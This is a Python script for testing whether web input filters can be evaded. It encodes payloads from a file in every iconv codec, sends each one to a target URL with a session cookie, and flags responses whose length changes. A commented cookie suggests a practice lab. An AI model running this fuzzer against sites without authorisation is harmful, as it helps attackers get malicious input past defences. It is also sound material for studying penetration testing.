import requests
import sys
import iconv_codecs
import time
try:
    from urllib.parse import urlparse
except ImportError:
     import urllib as urlparse

print(sys.argv)

url = sys.argv[1]
method = sys.argv[2]
payload_file = sys.argv[3]
cookie = sys.argv[4]
normal_count = sys.argv[5]
output_file = sys.argv[6]

# Read list of payloads from file
with open(payload_file, 'r') as rf:
	contents = rf.read()
	contents = contents.split('\n')

sess = requests.Session()
headers = {"Cookie": cookie}    #headers = {"Cookie": "PHPSESSID=t3u2vbapjdedt2t75e22n2vlhv;security=low"}
print(headers)
success_payloads = []
success_url = []
success_response_len = []
success_counter = 0

BUFFER_SIZE = 10

error_list = []

# Get encoding lists
encodings = list(iconv_codecs.get_supported_codecs())

total = len(contents)*len(encodings)
counter = 0

start_time = time.time()

# URL Encode and send each payload 
for payload in contents:
	
	# Applying encoding codecs
	for encoding in encodings:
		
		# Registering the codec first
		iconv_codecs.register(encoding)	
	
		# Encode the payload
		try:
			encoded_payload = payload.encode(encoding)
		except Exception as e:
			counter += 1
			error_list.append({"Encoding" : "encoding", "Payload" : payload, "Reason" : str(e)})			
			continue

		# URL Encoding 
		final_payload = urlparse.quote(encoded_payload)
	
		url_ = url.replace('X', final_payload)
		response = sess.get(url_, data={}, headers=headers)
	
		BUFFER_SIZE = len(final_payload)    
		# Check the length of the response
		if not ((int(normal_count) - BUFFER_SIZE) < len(response.text) < (int(normal_count) + BUFFER_SIZE)):
			success_payloads.append("[+] Payload: {}\n[+] Encoding: {}\n[+] Encoded: {}\nResponse URL: {}\n Response Length {}\n".format(payload, encoding, final_payload, response.request.url, str(len(response.text))))
			success_counter+=1

		sys.stdout.write("\r Payload Sent: {}/{} - {}%".format(counter, total, (float(counter)/float(total))*100))
		counter += 1

time_run = time.time() - start_time
# Write the results to a file
with open(output_file, 'w') as wf:
	for i in success_payloads:
		wf.write(i + '\n')
	wf.write(str(success_counter) + ' worked our of ' + str(total))
	wf.write("Runtime: {} seconds".format(time_run))
	

with open(output_file+".errors", "w") as wf:
	wf.write("--------------ERRORS-------------\n")
	wf.write("There are {} errors\n".format(len(error_list)))
	wf.write("ERROR DUMP:\n\n------------\n\n{}".format(str(error_list)))
